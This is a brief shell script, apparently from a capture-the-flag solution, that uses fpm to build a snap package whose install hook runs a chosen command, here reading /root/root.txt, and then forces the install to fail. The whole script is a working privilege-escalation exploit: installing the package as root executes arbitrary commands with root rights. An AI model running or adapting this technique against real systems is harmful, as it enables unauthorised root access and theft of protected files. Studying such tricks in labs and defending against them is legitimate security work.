COMMAND='cat /root/root.txt'
init_dir=$(pwd)
temp=$(mktemp -d)
cd $temp
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n namesnap -s dir -t snap -a all meta
cp  $temp/namesnap* $init_dir
